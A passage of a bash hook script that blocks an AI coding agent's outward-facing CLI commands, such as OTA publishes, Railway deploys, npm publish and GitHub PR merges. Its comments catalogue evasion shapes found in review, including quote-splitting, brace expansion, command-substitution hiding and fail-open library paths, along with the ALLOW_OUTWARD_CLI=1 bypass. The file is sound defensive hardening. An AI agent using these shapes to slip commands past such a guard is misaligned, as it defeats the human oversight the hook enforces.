  grep -Eqi 'eas[^a-zA-Z]+(update|publish|submit)|eas[^a-zA-Z]+update:(delete|edit|republish|revert-update-rollout|roll-back-to-embedded|rollback)|eas[^a-zA-Z]+(channel|branch):(create|edit|delete|rename)|eas[^a-zA-Z]+build[^;&|]*--auto-submit|railway[^a-zA-Z]+(up|deploy|redeploy|restart|down|delete|remove|rm|run)|railway[^a-zA-Z]+(variable|variables|vars|var)[^a-zA-Z]+(set|delete)|railway[^a-zA-Z]+(service|environment)[^a-zA-Z]+delete|npm[^a-zA-Z]+publish|(npm|pnpm|yarn)([^a-zA-Z]+-{1,2}[^[:space:]]*)*[^a-zA-Z]+(run-script|run)([^a-zA-Z]+-{1,2}[^[:space:]]*)*[^a-zA-Z]+update:(preview|production)|(yarn|pnpm)([^a-zA-Z]+-{1,2}[^[:space:]]*)*[^a-zA-Z]+update:(preview|production)|gh[^a-zA-Z]+pr[^a-zA-Z]+(merge|close|edit|ready|reopen|review|lock|unlock|update-branch|revert)|gh[^a-zA-Z]+release[^a-zA-Z]+(create|delete|delete-asset|edit|upload)|gh[^a-zA-Z]+repo[^a-zA-Z]+(create|delete|archive|unarchive|edit|rename|sync|fork)|gh[^a-zA-Z]+api[^a-zA-Z]' <<< "$t" && return 0
  # Flag-correlated patterns — case-SENSITIVE (a case-insensitive `-R` would
  # false-match the `-r` inside `--remove-reviewer`).
  grep -Eq 'gh[^a-zA-Z]+pr[^a-zA-Z]+(create|comment)[^;&|]*(--repo|-R)' <<< "$t" && return 0
  return 1
}

# Raw-envelope form of the inline "ALLOW_OUTWARD_CLI=1 <command>" bypass, for
# the paths that never obtain a decoded $CMD (no-jq; jq-extraction failure).
raw_inline_bypass() {
  case "$1" in *'"command":"ALLOW_OUTWARD_CLI=1 '*) return 0 ;; esac
  return 1
}

# Without jq we cannot parse the envelope or run the precise matcher. Fail
# CLOSED only for a raw payload that plausibly names one of the outward verbs
# above (mirrors git-safety.sh's own no-jq fallback) — an unrelated Bash call
# with none of these substrings is unaffected.
if ! command -v jq >/dev/null 2>&1; then
  INPUT=$(cat)
  # Inline "ALLOW_OUTWARD_CLI=1 <command>" prefix — see the note below the
  # jq-available branch for why this is a SEPARATE check from the ambient
  # env-var one above.
  raw_inline_bypass "$INPUT" && exit 0
  if grep -Eq '"tool_name"[[:space:]]*:[[:space:]]*"Bash"' <<< "$INPUT" \
     && crude_smells_outward "$INPUT"; then
    printf '%s' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"guard-outward-cli: jq unavailable - failing closed for a command that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1."}}'
  fi
  exit 0
fi

# Defined BEFORE the envelope extraction below so the jq-failure fallbacks can
# use it. Safe: jq is confirmed present at this point (the no-jq branch above
# already returned), and this function is never reached from that branch.
deny() {
  jq -n --arg r "$1" \
    '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":$r}}'
  exit 0
}

INPUT=$(cat)
# A jq EXTRACTION failure is not the same as "no jq". The previous version
# spelled both as `|| exit 0` — so malformed JSON, an absent `tool_name`, or a
# renamed envelope field ALLOWED everything, while the no-jq path fails CLOSED
# on the identical input. Fall back to the same crude smell test instead.
if ! TOOL=$(printf '%s' "$INPUT" | jq -re '.tool_name' 2>/dev/null); then
  raw_inline_bypass "$INPUT" && exit 0
  if crude_smells_outward "$INPUT"; then
    deny "guard-outward-cli: the hook envelope's .tool_name could not be read (malformed JSON or a changed envelope shape) - failing closed via the crude smell test for a payload that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  exit 0
fi
[ "$TOOL" = "Bash" ] || exit 0
if ! CMD=$(printf '%s' "$INPUT" | jq -re '.tool_input.command' 2>/dev/null); then
  raw_inline_bypass "$INPUT" && exit 0
  if crude_smells_outward "$INPUT"; then
    deny "guard-outward-cli: the hook envelope's .tool_input.command could not be read (malformed JSON or a changed envelope shape) - failing closed via the crude smell test for a payload that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  exit 0
fi

# Inline "ALLOW_OUTWARD_CLI=1 <command>" prefix — the documented single-command
# escape hatch. This is a SEPARATE check from the ambient `[ -n "$ALLOW_OUTWARD_CLI" ]`
# ambient bypass above: a PreToolUse hook runs in its OWN process, spawned
# BEFORE the gated command's own shell ever executes — so a `VAR=val cmd`
# assignment typed as a prefix on the Bash tool_input.command string never
# reaches this hook's environment; it only takes effect once (if) the
# command itself runs, which is too late for a check that must run first.
# Recognizing the literal prefix in the command STRING is the only way to
# honor it as "one command" (mirrors git-safety.sh's INLINE_BYPASS pattern
# for SKIP_WORKTREE_CONTRACT=1).
case "$CMD" in "ALLOW_OUTWARD_CLI=1 "*) exit 0 ;; esac

# Fork-free: a $(cd ...) subshell here would be the ENTIRE added cost of reaching the shared
# fast-path helper below (measured ~1.9ms/call; sourcing itself is free) — this HERE now runs
# on every Bash tool call, not just ones that already matched the old inline filter. The
# */*) arm is load-bearing: a bare "${BASH_SOURCE[0]%/*}" returns the filename unchanged when
# invoked with no slash, the source below then fails, and (absent the fall-through design
# below) could silently skip this DENY gate.
case "${BASH_SOURCE[0]}" in */*) HERE="${BASH_SOURCE[0]%/*}" ;; *) HERE=. ;; esac

# Necessary-substring fast path via the shared helper (lib/fastpath-filter.sh)
# (project_per_bash_hook_overhead). This hook runs on EVERY Bash tool call, so it must reject
# the common case before doing any real work — before sourcing cmd-detect.sh and before
# either awk pass.
#
# TWO STAGES, and the second one is why this is correct. The single-stage raw
# `case "$CMD"` this replaces was justified as "cmd_bare only BLANKS characters,
# never inserts/moves them, so this is a strict superset". That was true of
# cmd_bare and FALSE of cmd_words, which DELETES quote characters and therefore
# synthesises needles absent from raw text: `e"a"s update` contains no `eas`, so
# the filter exited 0 and the verb published an OTA (review, 2026-08-16).
# See lib/fastpath-filter.sh for the full two-stage soundness argument.
#
# Matched under `nocasematch` because the predicates below are case-insensitive: a
# case-SENSITIVE fast path would exit 0 on `EAS update` before any of them ran. The shopt
# bracketing stays tightly scoped to just this call — lib/fastpath-filter.sh's
# cmd_fastpath_has does not (and, in bash 3.2, cannot) toggle it itself. (`pnpm` needs no
# entry of its own — it contains `npm`.)
#
# If the helper is unsourceable, do NOT exit here — fall through to the lib/cmd-detect.sh
# check below, which already has its own tested fail-closed handling (crude_smells_outward);
# losing the cheap pre-filter only costs performance in that (broken-install) case, never a
# decision.
if . "$HERE/lib/fastpath-filter.sh" 2>/dev/null && declare -F cmd_fastpath_has >/dev/null; then
  shopt -s nocasematch
  cmd_fastpath_has "$CMD" '*eas*' '*railway*' '*npm*' '*yarn*' '*gh*'
  # _OUT_FP_RC is an EXIT-STATUS capture (0 = matched), not a boolean "found" flag — code
  # review, 2026-09-02: the old inline filter's `_OUT_FASTPATH=1` meant "matched"; this is
  # `$?` from cmd_fastpath_has, where 0 means "matched" — same polarity as the check below,
  # but the inverted-from-before meaning is a misreading trap for the next editor if the name
  # still reads as a boolean.
  _OUT_FP_RC=$?
  shopt -u nocasematch
  [ "$_OUT_FP_RC" = 0 ] || exit 0
fi
# If the shared lib is unsourceable (broken install), jq IS available here
# (the no-jq branch above already returned) and deny() is already defined —
# fall back to the SAME crude smell test used by the no-jq path, applied to
# the already-extracted CMD, rather than silently allowing every command.
# (A previous version of this hook exited 0 here on the false premise that
# "the no-jq path already covers this" — jq-present + lib-missing is a
# DIFFERENT condition the no-jq branch never runs for, so nothing covered it.)
if ! . "$HERE/lib/cmd-detect.sh" 2>/dev/null || ! declare -F cmd_bare >/dev/null; then
  if crude_smells_outward "$CMD"; then
    deny "guard-outward-cli: lib/cmd-detect.sh is unsourceable (broken install) - failing closed via the crude smell test for a command that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  exit 0
fi

# --- command-position anchors (must follow the lib source: _CMD_REDIR) -------
# Command-position building blocks — GUARD-LOCAL widened copies of
# lib/cmd-detect.sh's `_CMD_POS_*`. See the header's "COMMAND-POSITION ANCHORS
# ARE GUARD-LOCAL" note for why these are not upstreamed. `!` is deliberately
# NOT first in the prefix bracket class (a leading `!`/`^` reads as negation to
# some bracket-expression implementations); a backtick inside a single-quoted
# shell string is literal, so no escaping is needed for either constant.
_OUT_POS_PREFIX='(^|[;&|(`{!])[[:space:]]*(([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*|env|command|builtin|exec|nohup|setsid|then|do|else|elif|time|'"$_CMD_REDIR"')[[:space:]]+)*'
_OUT_POS_SUFFIX='([[:space:]]|[);&|`{}<>]|$)'
# NON-SWALLOWING variant for a clause-cut whose downstream check DECIDES AN
# ALLOW on flag presence (currently: the `gh pr merge` --auto clause below —
# see its CLAUSE= comment for the full account of why this exists). Plain
# `${_OUT_POS_SUFFIX}[^;&|]*` CONSUMES the boundary character and then keeps
# capturing past it: when that boundary is whitespace this is correct and
# intended (more of the SAME clause follows, e.g. `merge 42 --auto`), but
# when the boundary is a hard separator/bracket (`;`,`&`,`|`,`)`,backtick,
# `{`,`}`) the verb's own clause has NO more of its own arguments — anything
# after that character belongs to a DIFFERENT command or construct, and must
# not be captured into THIS clause. This variant only continues capturing
# after WHITESPACE; a hard-separator or end-of-string boundary ends the
# clause immediately, with nothing captured past it — mirroring real bash
# command-position semantics exactly (verified: `gh pr merge;curl --auto`
# treats `curl` as a wholly separate command bash-side too).
#
# ROUND 5 (2026-09-02, independent baseline-reviewer finding on round 3's own
# fix): branch 1's continuation-stop class `[^;&|]*` only excluded `;`/`&`/`|`
# — it did NOT match branch 2's own boundary set (`)`,backtick,`{`,`}`), so
# once ANY argument preceded the boundary (branch 1 fires instead of branch
# 2), the swallow reopened for those four characters. Live, verified bypass
# for two of them: `$(gh pr merge 42)curl --auto` and `` `gh pr merge 42`curl
# --auto `` both silently ALLOWED — real bash executes `gh pr merge 42`
# UNCONDITIONALLY as the command-substitution subprocess, with no --auto
# reaching it at all, before ever getting to the `curl --auto` half; verified
# with a paired deny control and traced to the same CLAUSE=[...] literal the
# round-3 comment above describes. `{`/`}` in this same arg-present position
# are DIFFERENT: verified via `bash -c 'for w in ...; do printf "[%s]\n"
# "$w"; done'` that `gh pr merge 42{,x}curl --auto` real-bash-expands to
# `--auto` as a genuine SEPARATE argument of the SAME `gh pr merge` command
# (comma-brace-expansion splits words, it does not glue two commands
# together), and a bare `}` (no matching `{`, so no expansion at all) simply
# stays glued into the preceding argument token with `--auto` following as a
# normal, space-separated, genuine argument — in both cases `--auto`
# genuinely reaches `gh`, so ALLOW was never actually wrong for `{`/`}` here.
# Branch 1 is widened to the full `)`,backtick,`{`,`}` set anyway, matching
# branch 2 exactly on principle (the two branches partition one boundary
# concept and must not silently diverge again) and erring toward the
# established deny-conservative precedent for `{`/`}` set by round 1's fix to
# `_OUT_POS_SUFFIX` itself — this denies two more, harmless-but-bizarre
# shapes (a literal `}`/comma-brace glued straight onto a merge argument) as
# a side effect, never removes a real ALLOW: the sanctioned
# `gh pr merge --auto` / `gh pr merge 42 --auto --squash --delete-branch`
# paths contain none of `;&|)`{}` before `--auto` and are unaffected. Full
# 16-shape {zero-arg,arg-present}×{;,&,|,),backtick,{,},EOS} sweep and
# mutation evidence in
# docs/solutions/logic-errors/cmd-position-anchor-missed-brace-backtick-bang-boundaries-2026-08-28.md's
# "round 5" section.
_OUT_POS_SUFFIX_MERGE_CLAUSE='([[:space:]][^;&|)`{}]*|[);&|`{}<>]|$)'

BARE=$(printf '%s' "$CMD" | cmd_bare)
# WORDS is the argv-faithful rendering (lib/cmd-detect.sh): quote characters
# deleted so `eas "update"` / `eas up"date"` read as the `eas update` the shell
# actually builds, with separators INSIDE a span neutralised so a `;` in a commit
# message still cannot open a command position. $BARE survives for exactly ONE
# job, in the blank-rendering detector just below: a wholly-quoted command
# (`'eas update'`) BLANKS to nothing under cmd_bare while cmd_words renders it as
# a single word, and that difference is what routes it to the crude smell test
# instead of the precise matchers. Nothing else reads $BARE — do not delete it
# without deleting that detector's $BARE half too, and see the
# "wholly-quoted command" assertions in test-guard-outward-cli.sh, which exist
# precisely so that deletion goes red.
#
# UPDATED (todo P1-2026-08-17-quoted-command-substitution-inert, archived):
# every INVOCATION pattern below now matches $WORDS_DEEP (defined further
# down, right after this file's own broken-awk empty check), NOT plain
# $WORDS — $WORDS_DEEP additionally surfaces a verb hidden inside a LIVE
# command substitution, which plain cmd_words still (correctly, for its OTHER
# consumers) renders as an opaque quoted token. The ONE exception is the
# `gh pr merge --auto` carve-out's $CLAUSE extraction, which deliberately
# stays on plain $WORDS — see the CLAUSE assignment's own comment.
WORDS=$(printf '%s' "$CMD" | cmd_words)

# `declare -F cmd_bare` above proves the function is DEFINED, not that it
# WORKS. cmd_bare is implemented in awk; with jq/grep/sed present but awk
# ABSENT from PATH the lib sources cleanly, `declare -F` succeeds, the
# lib-unsourceable branch above is skipped — and cmd_bare then emits NOTHING,
# so every `grep -Eq … <<< "$BARE"` below finds nothing and this hook falls
# through to `exit 0` with ZERO fallback protection. Reproduced in review round
# 3 with a plain, unsplit `eas update --branch preview --platform all`, plus
# `npm publish` and `gh pr merge 42` — all ALLOWED, no crafting needed. Treat
# an all-blank $BARE from a non-blank $CMD as "the blanking primitive failed"
# and degrade to the crude smell test, mirroring the two branches above.
# Checked for BOTH renderings: cmd_words shares cmd_bare's awk backend, so a
# broken awk blanks them together — but asserting only one of the two would let a
# future divergence (a cmd_words-specific breakage) fall through silently.
if { [[ ! "$BARE" =~ [^[:space:]] ]] || [[ ! "$WORDS" =~ [^[:space:]] ]]; } \
   && [[ "$CMD" =~ [^[:space:]] ]]; then
  if crude_smells_outward "$CMD"; then
    deny "guard-outward-cli: the quote-aware rendering came back empty for a non-empty command - either its awk backend is missing/broken, or the command's entire text is quoted - so the precise matchers below cannot see it. Failing closed via the crude smell test for a command that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  exit 0
fi

# WORDS_DEEP additionally surfaces a verb hidden inside a LIVE (unquoted or
# double-quoted) $(...)/backtick command substitution — see lib/cmd-detect.sh's
# cmd_words_deep for the mechanism and
# docs/solutions/logic-errors/quoted-command-substitution-always-executes-2026-08-17.md
# for the bug this closes: `echo "$(eas update --branch preview --platform
# all)"` genuinely executes regardless of the surrounding double quotes, and
# plain $WORDS blanked it to an opaque token, same as any other quoted DATA.
#
# COMPUTED AFTER the empty-rendering check above, deliberately: WORDS_DEEP's
# own emptiness is not independently checked here — it is derived from the
# SAME awk backend already proven working by that check (cmd_words_deep calls
# plain cmd_words first, unconditionally), so a broken awk is already caught
# before this line ever runs.
#
# USED ONLY BY DENY-SHAPED / OCCURRENCE-COUNTING checks below, never by
# $WORDS's ONE grant-shaped consumer (the `gh pr merge --auto` carve-out's
# $CLAUSE extraction, further down) — see lib/cmd-detect.sh's cmd_words_deep
# header for why unioning substitution content into a GRANT-shaped read would
# be a deny→allow regression worse than the bug being fixed. $WORDS itself
# stays completely unmodified so that one read keeps its existing contract.
WORDS_DEEP=$(cmd_words_deep "$CMD")

# Dual-rendering flag scan, for DENY-ONLY checks. One pattern, both renderings,
# because each hides a spelling the other shows: a quoted VALUE (`--auto
# "--admin"`) survives only in raw $CMD, while a quoted-split NAME (`--ad"min"`)
# is reconstructed only in $WORDS. Reading both is free HERE and only here — a
# deny-only check can ADD a deny but can never grant a carve-out, so its false
# positives fall on the safe side. Do NOT reuse this for a check that GRANTS a
# carve-out: there, reading two renderings widens what gets waved through.
#
# The renderings are joined by a NEWLINE and MUST stay that way. Concatenated,
# the seam spells flags present in NEITHER string — end-of-$CMD `--ad` plus
# start-of-$WORDS `min` reads as `--admin` — and grep being line-oriented is the
# only thing making a boundary-spanning match impossible. The two
# "the $CMD/$WORDS seam cannot forge ..." assertions in
# test-guard-outward-cli.sh go RED if this is ever "simplified" to "$CMD$WORDS".
#
# Case-SENSITIVE by design — no `-i`, unlike the invocation matchers below.
# These patterns match flag NAMES, which the target CLIs themselves treat
# case-sensitively: `--ADMIN` is not a real flag, and a case-insensitive `-R`
# would false-match ordinary text. See the header's FLAG-detection note.
#
# PRECONDITION: call only AFTER `$CMD` (from the jq extraction) and `$WORDS` (line 414) are
# assigned, and only from a DENY-shaped check — never to GRANT a carve-out. Extracting this
# helper removed the last per-call-site reminder of both, so they are stated here, on the
# code that depends on them. An early call does NOT abort: `set -uo pipefail` has no `-e`, so
# the unbound-variable message goes to stderr and `grep`'s failure is swallowed by the `if`
# — the check silently reports "no match" and the guard FAILS OPEN. That is the shape the
# four degraded exit-early paths above (no-jq, jq-extraction failure, lib unsourceable,
# blank rendering) would create if one ever grew a flag scan.
scan_both() { grep -Eq "$1" <<< "$CMD
$WORDS"; }

# Necessary-substring fast path (project_per_bash_hook_overhead): a command
# without ANY of these literal substrings cannot match any predicate below.

# --- eas -------------------------------------------------------------------
# eas update/publish/submit (space-separated subcommand).
if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+(update|publish|submit)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
  deny "guard-outward-cli: command-position 'eas update/publish/submit' publishes an OTA update or app-store submission — the exact class of the 2026-08-16 accidental-OTA incident. Read-only forms (eas update:list, eas update:view, eas whoami, ...) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
# eas update:* MUTATING colon subcommands — verified against `eas update
# --help` (eas-cli 20.1.0); see the header's DOCUMENTED RESIDUALS entry for
# the verified-read-only counterpart (update:list/view/insights, unaffected
# by this pattern since the colon puts them outside this alternation).
if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+update:(delete|edit|republish|revert-update-rollout|roll-back-to-embedded|rollback)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
  deny "guard-outward-cli: command-position 'eas update:delete/edit/republish/revert-update-rollout/roll-back-to-embedded/rollback' mutates what OTA update end users receive — the same incident class as bare 'eas update'. Read-only colon forms (eas update:list, eas update:view, eas update:insights) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
# eas channel:*/branch:* MUTATING colon subcommands — a channel repoint or a
# branch delete changes which update end users receive, an effect identical to
# the already-denied `eas update:*` forms (review round 3 found all of these
# ALLOWED). Read-only `:list`/`:view` forms stay allowed.
if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+(channel|branch):(create|edit|delete|rename)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
  deny "guard-outward-cli: command-position 'eas channel:/branch: create/edit/delete/rename' repoints or deletes the channel/branch that decides which OTA update end users receive — the same effect class as 'eas update'. Read-only forms (eas channel:list, eas branch:view, ...) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
# `eas build --auto-submit` (and --auto-submit-with-profile) submits the
# resulting binary to the store as soon as the build finishes — a store
# mutation wearing a build command's name. Plain `eas build` stays allowed.
# Flag scan via scan_both (see its definition for why both renderings are read
# and why they must stay newline-joined). No trailing boundary, so
# `--auto-submit-with-profile` is caught by the same pattern. Leading boundary
# is `_OUT_FLAG_LEAD` (see its own definition) so a default-value expansion
# (`${x:---auto-submit}`) cannot donate the flag's boundary.
if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+build${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP" \
   && scan_both "${_OUT_FLAG_LEAD}"'--auto-submit'; then
  deny "guard-outward-cli: command-position 'eas build --auto-submit' submits the finished binary to the app store — an outward mutation, not just a build. Plain 'eas build' is unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- railway -----------------------------------------------------------------
# `run` is included: `railway run <cmd>` executes an ARBITRARY command with the
# live service's env injected — including the production DATABASE_URL (this
# repo's own prod backfill/seed docs use exactly that shape), so it is at least
# as outward as `railway up`.
if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(up|deploy|redeploy|restart|down|delete|remove|rm|run)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
  deny "guard-outward-cli: command-position 'railway up/deploy/redeploy/restart/down/delete/remove/rm/run' mutates a live Railway service ('railway run' executes an arbitrary command with the LIVE service env, incl. the production DATABASE_URL). Read-only forms (railway status, railway logs, railway whoami, ...) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
# railway variable set/delete (production secrets/env vars) and
# service/environment delete — a level deeper than the top-level verbs
# above, and at least as dangerous (an overwritten secret or a deleted
# service/environment is not recoverable by a redeploy the way up/down are).
if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(variable|variables|vars|var)[[:space:]]+(set|delete)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
  deny "guard-outward-cli: command-position 'railway variable/vars/var set/delete' mutates a live service's environment variables (may include production secrets). Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(service|environment)[[:space:]]+delete${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
  deny "guard-outward-cli: command-position 'railway service/environment delete' deletes a live Railway service or environment. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- npm publish -------------------------------------------------------------
if grep -Eqi "${_OUT_POS_PREFIX}npm[[:space:]]+publish${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
  deny "guard-outward-cli: command-position 'npm publish' pushes a package to the registry. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- this repo's OWN OTA publish scripts -------------------------------------
# `npm run update:preview` / `npm run update:production` exec
# `eas update --branch preview|production --platform all` against
# https://api.ocrecipes.com — a real OTA to real users, i.e. EXACTLY the
# incident class this hook exists for, reached through a command word the
# `npm publish` and `eas update` patterns above both miss. Review round 3
# found both ALLOWED, while this hook's own deny message and self-tests
# asserted they were safe. The sanctioned flow is now
# `ALLOW_OUTWARD_CLI=1 npm run update:preview -- --message "…"`.
# `run-script` is npm's alias for `run`; it is listed FIRST so leftmost-longest
# alternation cannot settle on the `run` prefix. `pnpm`/`yarn` are spelled out
# in the ANCHORED alternation — "pnpm contains npm" only helps the unanchored
# crude test; a command-position anchor sees the `p` before `npm` and misses it
# (caught by this file's own `pnpm run update:preview` case). The bare-script
# spelling that yarn/pnpm accept WITHOUT `run` gets its own pattern.
#
# FLAG RUNS: the first shape of this pattern required the script name to sit
# IMMEDIATELY after `run`, so any flag between them walked straight through —
# `npm run --silent update:preview`, `npm run -s update:preview`, and
# `npm --loglevel=error run update:preview` all ALLOWED, on the exact command
# class this block exists for. That is this repo's own
# `deny-gate-flag-presence-check-needs-raw-text-and-every-spelling` lesson
# recurring inside its own fix: matching the bare spelling of a command is not
# matching the command. `_OUT_FLAG_RUN` absorbs zero-or-more `-`/`--` flag words
# (with or without `=value`) in BOTH positions — before `run` (npm global flags)
# and after it (npm run flags). It deliberately does NOT absorb a non-flag word,
# so `npm run build update:preview` still does not match: only flags may
# intervene, never another script name.
# The optional trailing `([[:space:]]+[^-[:space:]][^[:space:]]*)?` absorbs a
# SPACE-SEPARATED flag value (`--loglevel error`, `-C /tmp`, `-w pkg`). Without
# it the run broke at the mandatory trailing space and `npm run --loglevel error
# update:preview`, `npm -C /tmp run update:preview` and `yarn --loglevel error
# update:preview` all ALLOWED — the first version of this fix closed only the
# single-token spellings (`-s`, `--silent`, `--flag=value`) while its own doc
# claimed "every spelling", which is the same overclaim one layer down.
# COST, accepted deliberately: the value-absorption is greedy-with-backtracking,
# so a command that runs a DIFFERENT script with a flag AND names update:preview
# as a later argument (`npm run --silent build update:preview`) now denies. That
# is fail-CLOSED on a command essentially nobody writes, and the plain
# no-flag form (`npm run build update:preview`) still ALLOWS — pinned both ways.
_OUT_FLAG_RUN='([[:space:]]+-{1,2}[^[:space:]]*([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+'
if grep -Eqi "${_OUT_POS_PREFIX}(npm|pnpm|yarn)${_OUT_FLAG_RUN}(run-script|run)${_OUT_FLAG_RUN}update:(preview|production)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP" \
   || grep -Eqi "${_OUT_POS_PREFIX}(yarn|pnpm)${_OUT_FLAG_RUN}update:(preview|production)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
  deny "guard-outward-cli: command-position 'npm run update:preview/update:production' (and the yarn/pnpm bare-script equivalents) execs 'eas update --branch preview|production --platform all' against the production domain — a real OTA to real users, the exact class of the 2026-08-16 incident. Every OTHER 'npm run <script>' is unaffected. Bypass: ALLOW_OUTWARD_CLI=1 npm run update:preview -- --message \"...\" (one command)."
fi

# --- gh: bare 'gh pr merge' (see the --auto/--admin carve-out in the header) -
GH_PR_MERGE_RE="${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+merge${_OUT_POS_SUFFIX}"
# The OCCURRENCE COUNT just below is counted on $WORDS_DEEP (so a merge hidden
# inside a live substitution is not silently invisible to this whole block);
# the CLAUSE extraction feeding the --auto carve-out further down deliberately
# stays on plain $WORDS instead — see that assignment's own comment for why
# the two must diverge. $WORDS's one-quoted-span-is-one-word property is what
# makes the carve-out check safe: `-b "use --auto next time"` renders as the
# single token `usex--autoxnextxtime`, which is not `--auto`, so a quoted
# decoy cannot grant the carve-out. Reading $BARE here
# instead would make `gh pr "merge" 42` invisible; an earlier revision counted on
# both and denied when they disagreed, which was strictly worse — equal counts do
# not prove the two renderings found the SAME occurrence
# (`gh pr merge"x" 42 --auto; gh pr "merge" 99` counts 1 in each, from different
# clauses, and read --auto out of the wrong one).
GH_PR_MERGE_OCCURRENCES=$(printf '%s' "$WORDS_DEEP" | grep -oiE "$GH_PR_MERGE_RE" | wc -l | tr -d '[:space:]')
if [ "${GH_PR_MERGE_OCCURRENCES:-0}" -gt 1 ]; then
  deny "guard-outward-cli: more than one command-position 'gh pr merge' occurrence — ambiguous, cannot verify each carries --auto. Denying is the safe direction for a deny gate. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
elif [ "${GH_PR_MERGE_OCCURRENCES:-0}" -eq 1 ]; then
  # `--repo`/`-R` retargets the merge at an ARBITRARY repository — the --auto
  # carve-out is scoped to THIS repo's own sanctioned automerge pipeline, which
  # never passes it. Checked FIRST so it wins regardless of --auto.
  if gh_pr_clause_has_repo 'merge'; then
    deny "guard-outward-cli: 'gh pr merge' with --repo/-R targets a DIFFERENT GitHub repository with the user's PAT — outside the --auto carve-out, which exists only for this repo's own /todo automerge pipeline (it never passes --repo). Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  # DELIBERATELY reads plain $WORDS here, not $WORDS_DEEP, even though the
  # occurrence count just above is deep — this is the ONE grant-shaped read in
  # this file (HAS_REAL_AUTO below GRANTS the carve-out on a real --auto, it
  # does not just add a deny), and cmd_words_deep's own header documents why a
  # grant-shaped check must never read it: a decoy substitution manufacturing
  # `--auto` as an unrelated invocation's own token must never be read as
  # satisfying THIS command's carve-out. Net effect when the one counted
  # occurrence is itself hidden inside a substitution: CLAUSE comes back empty
  # (nothing on the shallow line matches "gh pr merge"), HAS_REAL_AUTO stays
  # "no", and the merge is denied — the safe direction, not a bypass. A
  # substitution-hidden `gh pr merge <n> --auto` (a genuinely self-contained,
  # really-executing invocation that DOES carry a real --auto) is therefore a
  # documented, conservative residual: denied rather than allowed, same as
  # every other "cannot verify --auto" case this check already denies today.
  #
  # MERGE RESOLUTION 2026-09-03 (integration of PR #910 with PR #912): both
  # PRs rewrote this CLAUSE line. They AGREE on the source (`$WORDS`, shallow
  # — for the grant-shaped reason documented immediately above, which PR #910
  # did not change) and differ only in the clause-cut suffix, where PR #910's
  # `_OUT_POS_SUFFIX_MERGE_CLAUSE` supersedes the older swallowing
  # `${_OUT_POS_SUFFIX}[^;&|]*` form. Both comment blocks are kept because
  # they document orthogonal properties of the same line: WHICH TEXT is
  # scanned (this block) vs. WHERE THE CAPTURED CLAUSE STOPS (the block
  # below). Contrast GH_API_CLAUSE further down, where the same two PRs
  # collided on BOTH axes and the resolution had to combine them.
  # `_OUT_POS_SUFFIX` closes the 'merge' match here. It gained `{`/`}` as
  # closers on 2026-09-02 (previously it did not) — the same two closers the
  # lib's `_CMD_POS_SUFFIX` already had (see the COMMAND-POSITION ANCHORS
  # header near the top of this file). `{`/`}` are a REAL bypass here, not
  # the cosmetic gap an earlier version of this comment claimed: a COMMA-form
  # brace span glued to a verb (`merge{,x}`) is real bash brace EXPANSION —
  # `merge{,x}` expands to the two separate words `merge` and `mergex`,
  # placing a standalone, real `merge` token in command position — while a
  # NO-comma/NO-range span (`merge{x}`) genuinely stays one bash WORD and was
  # never the issue FOR BASH'S OWN word-splitting; the earlier version of
  # this comment tested only that case and wrongly generalized "inert" to
  # both. CORRECTION (2026-09-02, round 2): that "never the issue" framing is
  # true of bash, but NOT of the regex shipped here — `_OUT_POS_SUFFIX` makes
  # no comma/no-comma distinction, so ANY literal `{` glued to `merge` is now
  # an unconditional boundary and DENIES, comma or not (`gh pr merge{x} 42`
  # and `gh pr merge{1..3} 42` both deny, verified directly against the
  # hook). That is deliberate conservatism (a DENY-only anchor can only ever
  # ADD matches, see below), not a security regression — but the code does
  # not preserve the bash-level distinction this comment originally implied
  # it did. Confirmed live before the fix: `gh pr merge{,x} 42` was SILENTLY
  # ALLOWED where the bare/spaced form correctly denies (same bypass
  # reproduced at the `eas update`, `npm publish`, `railway up`, `eas build
  # --auto-submit` call sites, and at GH_API_RE, the gh-api occurrence
  # counter — six sites, not "every `_OUT_POS_SUFFIX`-gated check" as an
  # earlier version of this comment claimed). CORRECTION (2026-09-02, round
